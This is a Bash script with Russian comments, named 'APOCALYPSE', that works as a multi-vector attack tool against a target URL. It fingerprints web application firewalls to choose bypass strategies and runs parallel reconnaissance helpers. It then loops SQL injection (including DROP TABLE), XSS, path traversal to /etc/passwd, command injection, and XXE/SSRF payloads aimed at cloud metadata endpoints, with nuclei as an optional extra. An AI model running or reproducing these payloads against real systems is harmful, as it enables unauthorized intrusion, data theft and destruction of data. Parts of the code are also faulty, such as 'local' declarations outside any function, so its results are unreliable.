#!/bin/bash
# APOCALYPSE — Мульти-векторный комбайн
# Одновременно задействует ВСЕ доступные модули против цели
# Выбирает лучшие векторы на основе ИИ-предсказания

TARGET=$1
[ -z "$TARGET" ] && echo "Usage: $0 http://target.com [threads] [duration_min]" && exit 1

THREADS=${2:-50}
DURATION_MIN=${3:-30}
DOMAIN=$(echo "$TARGET" | sed 's|https\?://||;s|/.*||')
START=$(date +%s)
END=$((START + DURATION_MIN * 60))
APOC_DIR="$HOME/.shadow_apocalypse"
mkdir -p "$APOC_DIR/vectors" "$APOC_DIR/results" "$APOC_DIR/intel"

echo "╔══════════════════════════════════════════════╗"
echo "║   ☠️  APOCALYPSE — Тотальная атака           ║"
echo "╚══════════════════════════════════════════════╝"
echo "Цель: $TARGET | Потоков: $THREADS | Время: ${DURATION_MIN}мин"
echo ""

# ФАЗА 0: ПРЕДСКАЗАНИЕ ЗАЩИТЫ (новое)
echo "[APOC] 🔮 Фаза 0: Предсказание защиты..."
source ~/.shadow_ultimate_ai_v2.sh 2>/dev/null
WAF_CHECK=$(curl -sk --max-time 5 "$TARGET" -o /dev/null -w "%{http_code}" 2>/dev/null)
WAF_HEADERS=$(curl -sk --max-time 5 -I "$TARGET" 2>/dev/null | grep -iE "waf|cloudflare|akamai|imperva|f5|modsecurity|barracuda|fortinet|citrix")

echo "[APOC] Ответ: HTTP $WAF_CHECK"
if echo "$WAF_HEADERS" | grep -qi "cloudflare"; then
    echo "[APOC] 🛡️ Обнаружен Cloudflare — активирую обход через origin IP"
    STRATEGY="stealth+origin_bypass"
elif echo "$WAF_HEADERS" | grep -qiE "akamai|imperva|f5"; then
    echo "[APOC] 🛡️ Enterprise WAF — активирую квантовое туннелирование"
    STRATEGY="quantum+slow"
elif [ "$WAF_CHECK" = "403" ] || [ "$WAF_CHECK" = "406" ]; then
    echo "[APOC] 🛡️ WAF/ModSecurity — активирую мутацию пейлоадов"
    STRATEGY="mutation+split"
else
    echo "[APOC] ✅ Нет видимого WAF — полный натиск"
    STRATEGY="full_assault"
fi
echo ""

# ФАЗА 1: РАЗВЕДКА (много источников одновременно)
echo "[APOC] ⚡ Фаза 1: Мульти-разведка ($THREADS потоков)..."

# Запускаем все разведывательные модули параллельно
(
    ~/.shadow_deep_recon.sh "$TARGET" 2>/dev/null &
    ~/.shadow_live_recon.sh "$TARGET" 2>/dev/null &
    ~/.shadow_spider_v2.sh "$TARGET" 2>/dev/null &
    ~/.shadow_radar.sh "$TARGET" 2>/dev/null &
    ~/.shadow_portscan_pro.sh "$DOMAIN" 2>/dev/null &
    ~/.shadow_osint_search.sh "$DOMAIN" 2>/dev/null &
    ~/.shadow_omniscient.sh "$DOMAIN" 2>/dev/null &
    ~/.shadow_void_collector.sh "$TARGET" 2>/dev/null &
    wait
) > "$APOC_DIR/intel/recon_$(date +%s).txt" 2>&1 &
echo "[APOC] Разведка запущена в фоне"

# ФАЗА 2: МУЛЬТИ-ВЕКТОРНАЯ АТАКА
echo "[APOC] ⚡ Фаза 2: Мульти-векторная атака..."

# Вектор 1: SQLi
sql_inject() {
    local payloads=(
        "' OR '1'='1"
        "admin'--"
        "1' AND 1=1--"
        "' UNION SELECT NULL--"
        "1; DROP TABLE users--"
        "' OR 1=1 LIMIT 1--"
    )
    while [ $(date +%s) -lt $END ]; do
        local p="${payloads[$((RANDOM % ${#payloads[@]}))]}"
        local code=$(curl -sk --max-time 3 "$TARGET?id=$p" -o /dev/null -w "%{http_code}" 2>/dev/null)
        echo "SQLi|$p|$code|$(date +%s)" >> "$APOC_DIR/vectors/sqli.txt"
        sleep 0.$((RANDOM % 10))
    done
}

# Вектор 2: XSS
xss_inject() {
    local payloads=(
        "<script>alert(1)</script>"
        "<img src=x onerror=alert(1)>"
        "javascript:alert(1)"
        "<svg/onload=alert(1)>"
        "'-alert(1)-'"
    )
    while [ $(date +%s) -lt $END ]; do
        local p="${payloads[$((RANDOM % ${#payloads[@]}))]}"
        local code=$(curl -sk --max-time 3 "$TARGET?q=$p" -o /dev/null -w "%{http_code}" 2>/dev/null)
        echo "XSS|$p|$code|$(date +%s)" >> "$APOC_DIR/vectors/xss.txt"
        sleep 0.$((RANDOM % 10))
    done
}

# Вектор 3: Path Traversal
path_traverse() {
    local paths=(
        "../../etc/passwd"
        "..\\..\\windows\\win.ini"
        "/etc/passwd%00"
        "....//....//etc/passwd"
        "..%2f..%2f..%2fetc%2fpasswd"
    )
    while [ $(date +%s) -lt $END ]; do
        local p="${paths[$((RANDOM % ${#paths[@]}))]}"
        local code=$(curl -sk --max-time 3 "$TARGET?file=$p" -o /dev/null -w "%{http_code}" 2>/dev/null)
        echo "LFI|$p|$code|$(date +%s)" >> "$APOC_DIR/vectors/lfi.txt"
        sleep 0.$((RANDOM % 10))
    done
}

# Вектор 4: Command Injection
cmd_inject() {
    local cmds=(
        ";id"
        "|whoami"
        "\`id\`"
        ";cat /etc/passwd"
        "|ls -la"
        ";uname -a"
    )
    while [ $(date +%s) -lt $END ]; do
        local c="${cmds[$((RANDOM % ${#cmds[@]}))]}"
        local code=$(curl -sk --max-time 3 "$TARGET?cmd=$c" -o /dev/null -w "%{http_code}" 2>/dev/null)
        echo "CMD|$c|$code|$(date +%s)" >> "$APOC_DIR/vectors/cmd.txt"
        sleep 0.$((RANDOM % 10))
    done
}

# Вектор 5: XXE / SSRF
xxe_ssrf() {
    local payloads=(
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'
        "http://169.254.169.254/latest/meta-data/"
        "http://127.0.0.1:8080/admin"
        "file:///etc/passwd"
    )
    while [ $(date +%s) -lt $END ]; do
        local p="${payloads[$((RANDOM % ${#payloads[@]}))]}"
        local code=$(curl -sk --max-time 3 -d "$p" "$TARGET/api" -o /dev/null -w "%{http_code}" 2>/dev/null)
        echo "XXE|$p|$code|$(date +%s)" >> "$APOC_DIR/vectors/xxe.txt"
        sleep 1
    done
}

# Запускаем все векторы параллельно с ограничением потоков
echo "[APOC] Запускаю векторы: SQLi, XSS, LFI, CMDi, XXE/SSRF, Nuclei..."
sql_inject &
xss_inject &
path_traverse &
cmd_inject &
xxe_ssrf &

# Дополнительно: Nuclei если есть
command -v nuclei >/dev/null 2>&1 && {
    nuclei -u "$TARGET" -silent -timeout 5 -rl 10 -c 5 > "$APOC_DIR/vectors/nuclei.txt" 2>/dev/null &
    echo "[APOC] Nuclei запущен"
}

# Мониторинг
echo ""
echo "[APOC] ☠️ Атака активна. Мониторинг:"
while [ $(date +%s) -lt $END ]; do
    local sqli=$(wc -l < "$APOC_DIR/vectors/sqli.txt" 2>/dev/null || echo 0)
    local xss=$(wc -l < "$APOC_DIR/vectors/xss.txt" 2>/dev/null || echo 0)
    local lfi=$(wc -l < "$APOC_DIR/vectors/lfi.txt" 2>/dev/null || echo 0)
    local cmd=$(wc -l < "$APOC_DIR/vectors/cmd.txt" 2>/dev/null || echo 0)
    local xxe=$(wc -l < "$APOC_DIR/vectors/xxe.txt" 2>/dev/null || echo 0)
    local total=$((sqli + xss + lfi + cmd + xxe))

    local elapsed=$(($(date +%s) - START))
    local remaining=$((END - $(date +%s)))
    echo "  ⏱️ ${elapsed}s | Осталось: ${remaining}s | Атак: $total (SQLi:$sqli XSS:$xss LFI:$lfi CMDi:$cmd XXE:$xxe)"
    sleep 30
done

# Финал
echo ""
echo "[APOC] ☠️ Собираю результаты..."
wait
echo ""
echo "══════════════════════════════════════════════"
echo "  ☠️  APOCALYPSE ЗАВЕРШЁН"
echo ""
echo "  SQLi:      $(wc -l < "$APOC_DIR/vectors/sqli.txt" 2>/dev/null || echo 0) атак"
echo "  XSS:       $(wc -l < "$APOC_DIR/vectors/xss.txt" 2>/dev/null || echo 0) атак"
echo "  LFI:       $(wc -l < "$APOC_DIR/vectors/lfi.txt" 2>/dev/null || echo 0) атак"
echo "  CMDi:      $(wc -l < "$APOC_DIR/vectors/cmd.txt" 2>/dev/null || echo 0) атак"
echo "  XXE/SSRF:  $(wc -l < "$APOC_DIR/vectors/xxe.txt" 2>/dev/null || echo 0) атак"
echo "  Nuclei:    $(wc -l < "$APOC_DIR/vectors/nuclei.txt" 2>/dev/null || echo 0) находок"
echo ""
echo "  Все результаты: $APOC_DIR/"
echo "══════════════════════════════════════════════"
